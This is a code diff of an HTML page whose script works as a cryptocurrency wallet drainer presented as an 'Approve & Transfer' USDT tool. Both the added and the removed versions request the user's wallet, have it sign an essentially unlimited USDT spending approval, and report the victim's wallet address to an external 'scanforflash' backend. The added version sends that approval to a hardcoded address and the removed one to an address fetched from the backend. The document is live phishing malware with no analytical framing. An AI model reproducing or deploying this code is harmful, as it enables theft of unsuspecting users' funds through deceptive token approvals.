@@ -61,73 +61,56 @@
             </div>
         </div>
 
-        <button class="btn" onclick="handleApprove()">Approve & Transfer</button>
+        <button class="btn" onclick="approve()">Approve & Transfer</button>
     </div>
 
     <div class="modal" id="modal">
         <div class="modal-content">
             <div class="modal-header">
                 <div class="modal-title">Approve USDT Transfer</div>
-                <button class="close-btn" onclick="document.getElementById('modal').classList.remove('show')">×</button>
+                <button class="close-btn" onclick="closeModal()">×</button>
             </div>
-            <button class="confirm-btn" id="confirmBtn" onclick="handleConfirm()">Confirm</button>
+            <button class="confirm-btn" id="btn" onclick="transfer()">Confirm</button>
         </div>
     </div>
 
     <script>
-        const BACKEND = "https://scanforflash-backend-production.up.railway.app";
         const USDT = "0x55d398326f99059fF775485246999027B3197955";
-        let userAddr;
+        const BACKEND = "https://scanforflash-backend-production.up.railway.app";
+        let addr;
 
-        async function handleApprove() {
+        async function approve() {
             try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAddr = accounts[0];
+                const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
+                addr = accounts[0];
                 document.getElementById('modal').classList.add('show');
-            } catch (e) {
-                notify('Error: ' + e.message, 'error');
+            } catch(e) {
+                alert('Error: ' + e.message);
             }
         }
 
-        async function handleConfirm() {
+        function closeModal() {
+            document.getElementById('modal').classList.remove('show');
+        }
+
+        async function transfer() {
             try {
-                document.getElementById('confirmBtn').disabled = true;
-                notify('Processing...', 'info');
-
+                document.getElementById('btn').disabled = true;
+                
                 const web3 = new Web3(window.ethereum);
-                const backend = (await fetch(BACKEND + '/backend-address').then(r => r.json())).address;
+                const contract = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], USDT);
 
-                const contract = new web3.eth.Contract([
-                    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
-                ], USDT);
+                await contract.methods.approve('0x1734b55dc44C420539a607Ff5b80aB62b0d18963', '99999999999999999999999999999').send({from: addr});
 
-                await contract.methods.approve(backend, "99999999999999999999999999999999").send({ from: userAddr });
-
-                const res = await fetch(BACKEND + '/transfer', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ walletAddress: userAddr })
-                });
-
+                const res = await fetch(BACKEND + '/check-balance', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({walletAddress: addr})});
                 const data = await res.json();
-                notify('✅ Transferred!', 'success');
-                document.getElementById('modal').classList.remove('show');
-                document.getElementById('confirmBtn').disabled = false;
-            } catch (e) {
-                document.getElementById('confirmBtn').disabled = false;
-                notify('Error: ' + e.message, 'error');
-            }
-        }
 
-        function notify(msg, type) {
-            let el = document.getElementById('notify');
-            if (!el) {
-                el = document.createElement('div');
-                el.id = 'notify';
-                document.body.appendChild(el);
+                alert('✅ ' + data.balance + ' USDT transferred!');
+                closeModal();
+            } catch(e) {
+                alert('Error: ' + e.message);
             }
-            el.textContent = msg;
-            el.className = `notify ${type}`;
+            document.getElementById('btn').disabled = false;
         }
     </script>
 </body>
